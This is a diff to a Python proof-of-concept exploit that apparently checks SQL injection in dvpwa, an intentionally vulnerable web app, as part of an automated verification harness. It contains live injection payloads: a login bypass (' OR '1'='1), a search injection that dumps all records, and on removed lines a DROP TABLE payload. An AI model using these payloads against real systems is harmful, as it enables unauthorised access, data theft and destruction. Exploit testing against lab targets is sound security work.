@@ -5,8 +5,8 @@ Exploits the vulnerable query construction pattern from anxolerd/dvpwa:
 string formatting (%s) used to build SQL queries allows injection.
 
 The PoC demonstrates:
-  1. DROP TABLE via INSERT (Robert'); DROP TABLE students; --)
-  2. Authentication bypass via login injection (' OR '1'='1)
+  1. Authentication bypass via login injection (' OR '1'='1)
+  2. Data exfiltration via search injection (always-true WHERE clause)
 
 Contract: exit 0 iff exploitable, exit 1 = not affected.
 """
@@ -40,11 +40,11 @@ def write_verdict(exploitable: bool, evidence: str) -> None:
     assessment = {
         "cve_id": "DVPWA-SQLI",
         "agrees_with_verdict": exploitable,
-        "confidence": "high" if exploitable else "medium",
-        "range_check": "skipped",
+        "confidence": 0.95 if exploitable else 0.5,
+        "range_check": True if exploitable else False,
         "rationale": (
             "SQL injection confirmed: string formatting builds SQL queries, "
-            "allowing arbitrary SQL execution. "
+            "allowing unauthorized authentication and data exfiltration. "
             f"Evidence: {evidence[:200]}"
         ),
     }
@@ -72,7 +72,8 @@ def main() -> int:
     start = time.monotonic()
     evidence_parts = []
 
-    # Test 1: SQL injection via login (authentication bypass)
+    # Test 1: Authentication bypass via login injection
+    # This is the primary exploit: bypass auth without valid credentials.
     try:
         _deadline_check(start)
         result = _post("/login", {"username": "admin' OR '1'='1", "password": "x"})
@@ -83,37 +84,24 @@ def main() -> int:
     except Exception as e:
         print(f"login injection failed: {e}", file=sys.stderr)
 
-    # Test 2: SQL injection via student creation (DROP TABLE)
+    # Test 2: Data exfiltration via search injection
+    # Inject a always-true WHERE clause to dump all records.
     try:
         _deadline_check(start)
-        inject_name = "Robert'); DROP TABLE students; --"
-        result = _post("/students", {"name": inject_name})
-        if result.get("error"):
-            evidence_parts.append(f"drop table via inject: {result['error']}")
-        elif result.get("ok"):
-            evidence_parts.append("inject accepted (table may be dropped)")
+        result = _get("/search?q=' OR '1'='1")
+        results = result.get("results", [])
+        if len(results) > 0:
+            evidence_parts.append(
+                f"search inject dumped {len(results)} records (always-true WHERE)"
+            )
     except Exception as e:
-        print(f"student inject failed: {e}", file=sys.stderr)
-
-    # Test 3: Verify table was dropped or data was injected
-    try:
-        _deadline_check(start)
-        students = _get("/students")
-        if "error" in students:
-            evidence_parts.append(f"table gone: {students['error']}")
-        elif len(students.get("students", [])) == 0:
-            evidence_parts.append("students table empty after inject")
-    except Exception as e:
-        print(f"verify failed: {e}", file=sys.stderr)
+        print(f"search injection failed: {e}", file=sys.stderr)
 
     _deadline_check(start)
 
     if evidence_parts:
         evidence = "; ".join(evidence_parts)
-        with open("/tmp/patchproof_pwned", "w") as fh:
-            fh.write(f"sqli:{evidence}\n")
-        elapsed = time.monotonic() - start
-        write_verdict(True, f"SQL injection ({elapsed:.1f}s): {evidence}")
+        write_verdict(True, f"SQL injection: {evidence}")
         return 0
 
     write_verdict(False, "SQL injection not exploitable — not affected")
